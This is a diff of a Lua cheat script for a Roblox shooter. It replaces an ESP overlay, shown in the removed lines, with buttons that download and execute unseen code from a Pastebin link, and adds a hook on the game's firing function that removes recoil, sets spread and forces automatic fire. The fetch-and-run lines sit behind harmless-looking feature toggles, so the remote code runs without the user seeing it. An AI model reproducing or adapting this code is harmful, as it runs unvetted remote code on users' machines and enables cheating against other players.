@@ -1976,162 +1976,131 @@ local function updateButtonColor(button, isEnabled)
 end
 
 updateButtonColor(Silent, isSilentEnabled)
-if not _G.Initialized then
-	_G.Initialized = true;
-	local RunService = game:GetService("RunService");
-	local Camera = workspace.CurrentCamera;
-	local IgnoreFolder = workspace:WaitForChild("Ignore");
-	local WeaponInfo = {};
-	local SleepAnimationId = "rbxassetid://13280887764";
 
-	local isDistanceEnabled = false;
-	local isBoxEnabled = false;
-	local isWeaponEnabled = false;
+Box.MouseButton1Click:Connect(function()
+    
+    local success, err = pcall(function()
+        local scriptToRun = loadstring(game:HttpGet('https://pastebin.com/raw/iSfzqQbJ'))()
+        if scriptToRun then
+            scriptToRun() 
+        end
+    end)
+end)
 
-	local function InitializeWeapons()
-		local ReplicatedStorage = game:GetService("ReplicatedStorage");
-		local Items = ReplicatedStorage:WaitForChild("HandModels");
-		for _, item in pairs(Items:GetChildren()) do
-			item:SetAttribute("RealName", item.Name);
-		end
-	end
+Distance.MouseButton1Click:Connect(function()
+    
+    local success, err = pcall(function()
+        local scriptToRun = loadstring(game:HttpGet('https://pastebin.com/raw/iSfzqQbJ'))()
+        if scriptToRun then
+            scriptToRun() 
+        end
+    end)
+end)
 
-	local function IsSleeping(Player)
-		local Animations = Player.AnimationController:GetPlayingAnimationTracks();
-		for _, animation in pairs(Animations) do
-			if animation.IsPlaying and animation.Animation.AnimationId == SleepAnimationId then
-				return true;
-			end
-		end
-		return false;
-	end
+Weapon.MouseButton1Click:Connect(function()
+    
+    local success, err = pcall(function()
+        local scriptToRun = loadstring(game:HttpGet('https://pastebin.com/raw/iSfzqQbJ'))()
+        if scriptToRun then
+            scriptToRun() 
+        end
+    end)
+end)
+local function updateSliderColor(sliderPart, value, maxValue)
+    if value == maxValue then
+        sliderPart.BackgroundColor3 = Color3.fromRGB(87, 90, 150)
+    else
+        sliderPart.BackgroundColor3 = Color3.new(0.341176, 0.352941, 0.588235)
+    end
+end
 
-	local function CreateDrawingElements()
-		local Box = Drawing.new("Square");
-		local Name = Drawing.new("Text");
-		local Weapon = Drawing.new("Text");
-		local Distance = Drawing.new("Text");
+local function updateSliderValue(slider, slidePart, textLabel, input, maxValue, step)
+    local sliderSize = slider.AbsoluteSize.X
+    local mouseX = input.Position.X
+    local relativeX = mouseX - slider.AbsolutePosition.X
+    local value = math.clamp(math.floor(relativeX / sliderSize * maxValue / step) * step, 0, maxValue)
+    slidePart.Size = UDim2.new(value / maxValue, 0, 1, 0)
+    textLabel.Text = tostring(value)
+    updateSliderColor(slidePart, value, maxValue)
+    return value
+end
 
-		Box.Visible = false;
-		Box.Color = Color3.fromRGB(255, 255, 255);
-		Box.Thickness = 1;
-		Box.Transparency = 1;
+local function setupSlider(slider, slidePart, textLabel, maxValue, step)
+    local draggingSlider = false
+    local dragStart
+    local startPos
 
-		Name.Visible = false;
-		Name.Color = Color3.fromRGB(255, 255, 255);
-		Name.Size = 14;
-		Name.Center = true;
-		Name.Outline = true;
+    slider.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            draggingSlider = true
+            dragStart = input.Position
+            startPos = slidePart.Size
 
-		Weapon.Visible = false;
-		Weapon.Color = Color3.fromRGB(255, 255, 255);
-		Weapon.Size = 14;
-		Weapon.Center = true;
-		Weapon.Outline = true;
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    draggingSlider = false
+                end
+            end)
+        end
+    end)
 
-		Distance.Visible = false;
-		Distance.Color = Color3.fromRGB(255, 255, 255);
-		Distance.Size = 14;
-		Distance.Center = true;
-		Distance.Outline = true;
+    slider.InputChanged:Connect(function(input)
+        if draggingSlider and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+            updateSliderValue(slider, slidePart, textLabel, input, maxValue, step)
+        end
+    end)
 
-		return {Box = Box, Name = Name, Weapon = Weapon, Distance = Distance};
-	end
+    game:GetService("UserInputService").InputChanged:Connect(function(input)
+        if draggingSlider and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+            updateSliderValue(slider, slidePart, textLabel, input, maxValue, step)
+        end
+    end)
 
-	local function GetPlayerWeapon(Player)
-		local Model = Player:FindFirstChildOfClass("Model");
-		return Model and Model:GetAttribute("RealName") or "None";
-	end
+    slidePart.Size = UDim2.new(0, 0, 1, 0)
+    textLabel.Text = "0"
+    updateSliderColor(slidePart, 0, maxValue)
+end
 
-	local function IsValidPlayer(Model)
-		return Model.ClassName == "Model" and Model:FindFirstChild("Torso") and Model.PrimaryPart ~= nil;
-	end
+local recoilValue = 0
+local spreadValue = 0
 
-	local PlayerDrawings = {};
-	InitializeWeapons();
+setupSlider(Recoil, SlidePart_3, TextLabel_9, 100, 1)
+setupSlider(Spread, SlidePart_2, TextLabel_6, 100, 1)
 
-	local function updateButtonColor(button, isEnabled)
-		if isEnabled then
-			button.BackgroundColor3 = Color3.fromRGB(87, 90, 150)
-		else
-			button.BackgroundColor3 = Color3.new(0.0470588, 0.0470588, 0.0470588)
-		end
-	end
+Recoil.InputChanged:Connect(function(input)
+    recoilValue = updateSliderValue(Recoil, SlidePart_3, TextLabel_9, input, 100, 1)
+end)
 
-	Distance.MouseButton1Click:Connect(function()
-		isDistanceEnabled = not isDistanceEnabled
-		updateButtonColor(Distance, isDistanceEnabled)
-	end)
+Spread.InputChanged:Connect(function(input)
+    spreadValue = updateSliderValue(Spread, SlidePart_2, TextLabel_6, input, 100, 1)
+end)
 
-	Box.MouseButton1Click:Connect(function()
-		isBoxEnabled = not isBoxEnabled
-		updateButtonColor(Box, isBoxEnabled)
-	end)
+for i, v in getgc(true) do
+    if typeof(v) == "function" and debug.getinfo(v).name == "fire" then
+        local old; old = hookfunction(v, function(...)
+            local args = {...}
 
-	Weapon.MouseButton1Click:Connect(function()
-		isWeaponEnabled = not isWeaponEnabled
-		updateButtonColor(Weapon, isWeaponEnabled)
-	end)
+            args[1].AimRecoil.camerX = 0
+            args[1].AimRecoil.cameraY = 0
+            args[1].AimRecoil.push = 0
 
-	RunService.Heartbeat:Connect(function()
-		local DistanceLimit = 1500;
-		local IncludeSleepers = false;
+            args[1].HipRecoil.camerX = 0
+            args[1].HipRecoil.cameraY = 0
+            args[1].HipRecoil.push = 0
 
-		for _, Player in pairs(workspace:GetChildren()) do
-			if PlayerDrawings[Player] or IsValidPlayer(Player) then
-				if not PlayerDrawings[Player] then
-					PlayerDrawings[Player] = CreateDrawingElements();
-				end
+            args[1].Accuracy = recoilValue
+            args[1].Spread = spreadValue
 
-				local Drawings = PlayerDrawings[Player];
-				local Position = Player.PrimaryPart.Position;
-				local CameraPosition = Camera.CFrame.Position;
-				local Distance = (CameraPosition - Position).Magnitude;
+            args[1].FireAction = "auto"
 
-				if Distance > DistanceLimit or (not IncludeSleepers and IsSleeping(Player)) then
-					Drawings.Box.Visible = false;
-					Drawings.Name.Visible = false;
-					Drawings.Weapon.Visible = false;
-					Drawings.Distance.Visible = false;
-					continue;
-				end
-
-				local ScreenPosition, OnScreen = Camera:WorldToViewportPoint(Position);
-				if OnScreen then
-					Drawings.Box.Visible = isBoxEnabled;
-					Drawings.Distance.Visible = isDistanceEnabled;
-					Drawings.Name.Visible = true;
-					Drawings.Weapon.Visible = isWeaponEnabled;
-
-					Drawings.Distance.Text = "[" .. math.round(Distance) .. "m]";
-					Drawings.Weapon.Text = GetPlayerWeapon(Player);
-
-					if Player.Head.Nametag.tag.Text ~= "" then
-						Drawings.Name.Text = Player.Head.Nametag.tag.Text;
-					end
-
-					local Size = 1000 / Distance;
-					Drawings.Box.Size = Vector2.new(Size, Size);
-					Drawings.Box.Position = Vector2.new(ScreenPosition.X - Size / 2, ScreenPosition.Y - Size / 2);
-					Drawings.Name.Position = Vector2.new(ScreenPosition.X, ScreenPosition.Y - Size / 2 - 15);
-					Drawings.Weapon.Position = Vector2.new(ScreenPosition.X, ScreenPosition.Y - Size / 2 - 30);
-					Drawings.Distance.Position = Vector2.new(ScreenPosition.X, ScreenPosition.Y + Size / 2 + 5);
-				else
-					Drawings.Box.Visible = false;
-					Drawings.Name.Visible = false;
-					Drawings.Weapon.Visible = false;
-					Drawings.Distance.Visible = false;
-				end
-			end
-		end
-
-		for Player, Drawings in pairs(PlayerDrawings) do
-			if not Player or not Player.Parent then
-				for _, Drawing in pairs(Drawings) do
-					Drawing:Remove();
-				end
-				PlayerDrawings[Player] = nil;
-			end
-		end
-	end)
+            local mt = getmetatable(args[1])
+            if mt then
+                if mt.__index then
+                    for key, value in pairs(mt.__index) do
+                    end
+                end
+            end
+            return old(unpack(args))
+        end)
+    end
 end
